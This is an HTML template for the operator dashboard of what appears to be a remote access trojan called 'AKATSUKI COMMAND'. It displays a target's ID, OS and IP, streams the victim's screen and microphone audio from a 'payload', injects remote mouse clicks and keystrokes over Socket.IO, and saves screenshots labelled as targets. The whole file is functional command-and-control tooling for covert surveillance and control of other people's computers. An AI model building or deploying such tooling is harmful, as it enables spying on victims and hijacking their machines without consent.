<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AKATSUKI — Live Operations Center</title>
    <link rel="stylesheet" href="/static/akatsuki.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
    <script src="/static/jsmpeg.min.js"></script>
</head>
<body>
    <div class="background-effects">
        <div class="grid-overlay"></div>
        <div class="red-ambient"></div>
    </div>
    
    <header class="top-nav glass-panel">
        <div class="brand">
            <svg class="icon-cloud" viewBox="0 0 24 24" width="28" height="28"><path fill="currentColor" d="M17.5 19c2.5 0 4.5-2 4.5-4.5 0-2.3-1.8-4.2-4.1-4.5C17.3 6.6 14.4 4 11 4 7.1 4 4 7.1 4 11c0 .2 0 .5.1.7C2.3 12.1 1 13.9 1 16c0 2.8 2.2 5 5 5h11.5zM11 6c2.5 0 4.7 1.8 5.2 4.2l.2 1.1 1.1.1c1.5.2 2.5 1.5 2.5 3.1 0 1.7-1.3 3-3 3H6c-1.7 0-3-1.3-3-3 0-1.5 1-2.7 2.4-3l1.1-.2.4-1c.9-2.4 3.1-4.3 4.1-4.3z"/></svg>
            <h1>AKATSUKI <span class="accent">COMMAND</span></h1>
        </div>
        <div class="status-indicators">
            <div class="status-pill active" id="recIndicator">
                <span class="dot"></span> REC
            </div>
            <div class="latency" id="statLatency">-- ms</div>
        </div>
    </header>

    <main class="dashboard">
        <div class="video-container glass-panel">
            <div class="video-wrapper" id="streamWrapper">
                <canvas id="videoCanvas"></canvas>
                <div class="overlay-msg" id="streamOverlay">
                    <svg viewBox="0 0 24 24" width="48" height="48" class="pulse-icon"><path fill="currentColor" d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2zm0 18a8 8 0 1 1 8-8 8 8 0 0 1-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
                    <h2>AWAITING SIGNAL</h2>
                    <p>Execute 'live start' on payload</p>
                </div>
                <div class="crosshair" id="crosshair" style="display:none;">
                    <svg viewBox="0 0 24 24" width="24" height="24"><path fill="currentColor" d="M11 2v9H2v2h9v9h2v-9h9v-2h-9V2z"/></svg>
                </div>
            </div>
            
            <div class="toolbar">
                <div class="tool-group">
                    <span class="tool-label">QUALITY</span>
                    <button class="btn btn-q active" data-quality="high">HIGH</button>
                    <button class="btn btn-q" data-quality="medium">MED</button>
                    <button class="btn btn-q" data-quality="low">LOW</button>
                </div>
                
                <div class="tool-group">
                    <button class="btn btn-icon" id="btnMouse" onclick="toggleMouse()" title="Toggle Mouse Control">
                        <svg viewBox="0 0 24 24" width="18" height="18"><path fill="currentColor" d="M13 2v8h8c0-4.4-3.6-8-8-8zm-2 0C6.6 2 3 5.6 3 10v4c0 4.4 3.6 8 8 8s8-3.6 8-8v-2h-8V2z"/></svg>
                    </button>
                    <button class="btn btn-icon" id="btnKeyboard" onclick="toggleKeyboard()" title="Toggle Keyboard">
                        <svg viewBox="0 0 24 24" width="18" height="18"><path fill="currentColor" d="M20 5H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-9 3h2v2h-2V8zm0 3h2v2h-2v-2zM8 8h2v2H8V8zm0 3h2v2H8v-2zm-1 2H5v-2h2v2zm0-3H5V8h2v2zm9 7H8v-2h8v2zm0-4h-2v-2h2v2zm0-3h-2V8h2v2zm3 3h-2v-2h2v2zm0-3h-2V8h2v2z"/></svg>
                    </button>
                </div>
                
                <div class="tool-group">
                    <button class="btn btn-icon" onclick="takeScreenshot()" title="Screenshot">
                        <svg viewBox="0 0 24 24" width="18" height="18"><path fill="currentColor" d="M21 4H3C1.9 4 1 4.9 1 6v12c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H3V6h18v12zM12 7.5A4.5 4.5 0 0 0 7.5 12 4.5 4.5 0 0 0 12 16.5 4.5 4.5 0 0 0 16.5 12 4.5 4.5 0 0 0 12 7.5zm0 7A2.5 2.5 0 0 1 9.5 12 2.5 2.5 0 0 1 12 9.5 2.5 2.5 0 0 1 14.5 12 2.5 2.5 0 0 1 12 14.5z"/></svg>
                    </button>
                    <button class="btn btn-icon" id="btnFullscreen" onclick="goFullscreen()" title="Fullscreen">
                        <svg viewBox="0 0 24 24" width="18" height="18"><path fill="currentColor" d="M7 14H5v5h5v-2H7v-3zm-2-4h2V7h3V5H5v5zm12 7h-3v2h5v-5h-2v3zM14 5v2h3v3h2V5h-5z"/></svg>
                    </button>
                </div>
            </div>
        </div>

        <aside class="sidebar">
            <div class="widget glass-panel">
                <div class="widget-header">
                    <svg viewBox="0 0 24 24" width="16" height="16"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
                    <h3>TARGET DATA</h3>
                </div>
                <div class="data-grid">
                    <div class="data-row"><span class="lbl">ID</span><span class="val">{{ short_id }}</span></div>
                    <div class="data-row"><span class="lbl">OS</span><span class="val">{{ os_info }}</span></div>
                    <div class="data-row"><span class="lbl">IP</span><span class="val">{{ ip }}</span></div>
                    <div class="data-row"><span class="lbl">STATUS</span><span class="val status-text" id="liveStatus">OFFLINE</span></div>
                </div>
            </div>

            <div class="widget glass-panel">
                <div class="widget-header">
                    <svg viewBox="0 0 24 24" width="16" height="16"><path fill="currentColor" d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>
                    <h3>AUDIO FEED</h3>
                </div>
                <div class="audio-controls">
                    <button class="btn btn-icon" id="btnMute" onclick="toggleMute()"><svg viewBox="0 0 24 24" width="18" height="18"><path fill="currentColor" d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.89.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73l-9-9L4.27 3zM12 4L9.91 6.09 12 8.18V4z"/></svg></button>
                    <input type="range" id="volSlider" min="0" max="1" step="0.05" value="0.5" class="custom-slider">
                </div>
            </div>

            <div class="widget glass-panel">
                <div class="widget-header">
                    <svg viewBox="0 0 24 24" width="16" height="16"><path fill="currentColor" d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
                    <h3>METRICS</h3>
                </div>
                <div class="metrics-grid">
                    <div class="metric-box">
                        <div class="val" id="statFps">0</div>
                        <div class="lbl">FPS</div>
                    </div>
                    <div class="metric-box">
                        <div class="val" id="statBw">0</div>
                        <div class="lbl">KB/s</div>
                    </div>
                </div>
            </div>
        </aside>
    </main>

    <script>
        const CLIENT_ID = "{{ client_id }}";
        let mouseEnabled = false;
        let keyboardEnabled = false;
        
        // Connect SocketIO for commands/telemetry
        const socket = io('/live', { transports: ['websocket'] });
        socket.on('connect', () => socket.emit('join', { client_id: CLIENT_ID }));

        // --- Metrics tracking via WebSocket intercept ---
        let totalBytes = 0;
        let lastBytes = 0;
        let lastTime = Date.now();
        const startTime = Date.now();

        // Intercept WebSocket to count bytes BEFORE JSMpeg uses it
        const OriginalWS = window.WebSocket;
        window.WebSocket = function(url, protocols) {
            const ws = protocols ? new OriginalWS(url, protocols) : new OriginalWS(url);
            if (url.includes('/stream_down/')) {
                ws.addEventListener('message', (event) => {
                    if (event.data instanceof ArrayBuffer) {
                        totalBytes += event.data.byteLength;
                    } else if (event.data instanceof Blob) {
                        totalBytes += event.data.size;
                    } else if (typeof event.data === 'string') {
                        totalBytes += event.data.length;
                    }
                });
            }
            return ws;
        };
        // Copy prototype so instanceof checks work
        window.WebSocket.prototype = OriginalWS.prototype;
        window.WebSocket.CONNECTING = OriginalWS.CONNECTING;
        window.WebSocket.OPEN = OriginalWS.OPEN;
        window.WebSocket.CLOSING = OriginalWS.CLOSING;
        window.WebSocket.CLOSED = OriginalWS.CLOSED;

        // JSMpeg Setup
        const canvas = document.getElementById('videoCanvas');
        const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = `${wsProtocol}//${window.location.host}/stream_down/${CLIENT_ID}`;
        
        let player = new JSMpeg.Player(wsUrl, {
            canvas: canvas,
            audio: true,
            video: true,
            pauseWhenHidden: false,
            videoBufferSize: 1024 * 1024,  // 1MB video buffer
            audioBufferSize: 256 * 1024,   // 256KB audio buffer
            onSourceEstablished: () => {
                document.getElementById('streamOverlay').style.display = 'none';
                document.getElementById('liveStatus').textContent = 'LIVE';
                document.getElementById('liveStatus').style.color = '#ff3333';
                document.getElementById('liveStatus').classList.add('live');
            },
            onSourceCompleted: () => {
                document.getElementById('streamOverlay').style.display = 'flex';
                document.getElementById('liveStatus').textContent = 'OFFLINE';
                document.getElementById('liveStatus').style.color = '#666';
                document.getElementById('liveStatus').classList.remove('live');
            }
        });

        // --- Audio Controls ---
        // Start muted (browsers block autoplay audio)
        let isMuted = true;
        player.volume = 0;
        const btnMute = document.getElementById('btnMute');
        const volSlider = document.getElementById('volSlider');
        const svgMuted = '<svg viewBox="0 0 24 24" width="18" height="18"><path fill="currentColor" d="M16.5 12c0-1.77-1.02-3.29-2.5-4.03v2.21l2.45 2.45c.03-.2.05-.41.05-.63zm2.5 0c0 .94-.2 1.82-.54 2.64l1.51 1.51C20.63 14.91 21 13.5 21 12c0-4.28-2.99-7.86-7-8.77v2.06c2.89.86 5 3.54 5 6.71zM4.27 3L3 4.27 7.73 9H3v6h4l5 5v-6.73l4.25 4.25c-.67.52-1.42.93-2.25 1.18v2.06c1.38-.31 2.63-.95 3.69-1.81L19.73 21 21 19.73l-9-9L4.27 3zM12 4L9.91 6.09 12 8.18V4z"/></svg>';
        const svgUnmuted = '<svg viewBox="0 0 24 24" width="18" height="18"><path fill="currentColor" d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/></svg>';
        
        function toggleMute() {
            isMuted = !isMuted;
            if (isMuted) {
                player.volume = 0;
                btnMute.innerHTML = svgMuted;
                btnMute.classList.remove('active');
            } else {
                // Unlock AudioContext (required by browsers after user gesture)
                if (player.audioOut && player.audioOut.unlock) {
                    player.audioOut.unlock();
                }
                // Also try to resume AudioContext directly
                if (player.audioOut && player.audioOut.context && player.audioOut.context.state === 'suspended') {
                    player.audioOut.context.resume();
                }
                player.volume = parseFloat(volSlider.value);
                btnMute.innerHTML = svgUnmuted;
                btnMute.classList.add('active');
            }
        }

        volSlider.addEventListener('input', (e) => {
            if (!isMuted) player.volume = parseFloat(e.target.value);
        });

        // --- Metrics Update (every second) ---
        setInterval(() => {
            const now = Date.now();
            const elapsed = (now - lastTime) / 1000;
            if (elapsed <= 0) return;
            
            const bwKBs = Math.round((totalBytes - lastBytes) / elapsed / 1024);
            // Estimate FPS from bandwidth and typical frame size
            const fpsEst = player && player.video ? (player.video.decodedFrames || 0) : 0;
            
            document.getElementById('statBw').textContent = bwKBs;
            document.getElementById('statFps').textContent = fpsEst || '--';
            document.getElementById('statLatency').textContent = bwKBs > 0 ? 'OK' : '--';
            
            lastBytes = totalBytes;
            lastTime = now;
            
            // Reset decoded frames counter for next interval
            if (player && player.video) player.video.decodedFrames = 0;
        }, 1000);

        // --- Input Controls ---
        function toggleMouse() {
            mouseEnabled = !mouseEnabled;
            document.getElementById('btnMouse').classList.toggle('active', mouseEnabled);
            document.getElementById('crosshair').style.display = mouseEnabled ? 'flex' : 'none';
        }

        function toggleKeyboard() {
            keyboardEnabled = !keyboardEnabled;
            document.getElementById('btnKeyboard').classList.toggle('active', keyboardEnabled);
        }

        const streamWrapper = document.getElementById('streamWrapper');
        streamWrapper.addEventListener('mousemove', (e) => {
            if (!mouseEnabled) return;
            const rect = canvas.getBoundingClientRect();
            if (e.clientX < rect.left || e.clientX > rect.right || e.clientY < rect.top || e.clientY > rect.bottom) return;
            const crosshair = document.getElementById('crosshair');
            crosshair.style.left = (e.clientX - streamWrapper.getBoundingClientRect().left) + 'px';
            crosshair.style.top = (e.clientY - streamWrapper.getBoundingClientRect().top) + 'px';
        });

        streamWrapper.addEventListener('click', (e) => sendClickEvent(e, 'left'));
        streamWrapper.addEventListener('contextmenu', (e) => { e.preventDefault(); sendClickEvent(e, 'right'); });

        function sendClickEvent(e, button) {
            if (!mouseEnabled) return;
            const rect = canvas.getBoundingClientRect();
            if (e.clientX < rect.left || e.clientX > rect.right || e.clientY < rect.top || e.clientY > rect.bottom) return;
            const x = (e.clientX - rect.left) / rect.width;
            const y = (e.clientY - rect.top) / rect.height;
            socket.emit('input_event', { client_id: CLIENT_ID, event: { type: 'click', button: button, x: x, y: y } });
        }

        document.addEventListener('keydown', (e) => {
            if (!keyboardEnabled) return;
            e.preventDefault();
            socket.emit('input_event', { client_id: CLIENT_ID, event: { type: 'keydown', key: e.key } });
        });
        document.addEventListener('keyup', (e) => {
            if (!keyboardEnabled) return;
            e.preventDefault();
            socket.emit('input_event', { client_id: CLIENT_ID, event: { type: 'keyup', key: e.key } });
        });

        // Quality Control
        document.querySelectorAll('.btn-q').forEach(btn => {
            btn.addEventListener('click', () => {
                document.querySelectorAll('.btn-q').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                socket.emit('change_quality', { client_id: CLIENT_ID, quality: btn.dataset.quality });
            });
        });

        function takeScreenshot() {
            const link = document.createElement('a');
            link.download = `target_${CLIENT_ID.slice(0,8)}_${Date.now()}.png`;
            link.href = canvas.toDataURL('image/png');
            link.click();
        }

        function goFullscreen() {
            if (streamWrapper.requestFullscreen) streamWrapper.requestFullscreen();
        }
    </script>
</body>
</html>
